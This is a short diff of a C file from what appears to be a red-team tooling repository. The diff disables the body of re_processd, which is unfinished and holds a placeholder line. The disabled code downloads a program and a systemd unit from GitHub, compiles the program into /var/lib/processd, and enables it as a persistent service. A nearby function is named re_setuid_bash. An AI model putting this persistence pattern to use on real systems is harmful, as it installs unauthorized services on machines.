@@ -108,27 +108,28 @@ int re_setuid_bash(void){
 static const char *processd_c = NULL;
 static const char *processd_service = NULL;
 int re_processd(void){
-    // TODO: Add error handling
-    FILE *fp;
-
-    // Install prereqs
-    system("apt install -y libcurl4-openssl-dev");
-
-    // processd.c
-    // download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.c", "/tmp/processd.c");
-    fp = // BLAH BLAH BLAH BLAH BLAH TODO: FLAG: LEFT_OFF_HERE:
-    // processd executable
-    system("gcc /tmp/processd.c -o /var/lib/processd");
-    system("chmod 500 /var/lib/processd");
-    // remove tmp file
-    system("rm /tmp/processd.c");
-
-    // processd.service
-    // download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.service", "/etc/systemd/system/processd.service");
-    // Install service
-    system("systemctl daemon-reload && systemctl start processd && systemctl enable processd");
-
     return 0;
+    // TODO: Add error handling
+    // FILE *fp;
+
+    // // Install prereqs
+    // system("apt install -y libcurl4-openssl-dev");
+
+    // // processd.c
+    // // download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.c", "/tmp/processd.c");
+    // fp = // BLAH BLAH BLAH BLAH BLAH TODO: FLAG: LEFT_OFF_HERE:
+    // // processd executable
+    // system("gcc /tmp/processd.c -o /var/lib/processd");
+    // system("chmod 500 /var/lib/processd");
+    // // remove tmp file
+    // system("rm /tmp/processd.c");
+
+    // // processd.service
+    // // download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.service", "/etc/systemd/system/processd.service");
+    // // Install service
+    // system("systemctl daemon-reload && systemctl start processd && systemctl enable processd");
+
+    // return 0;
 }
 
 ////////////////////////////////////////
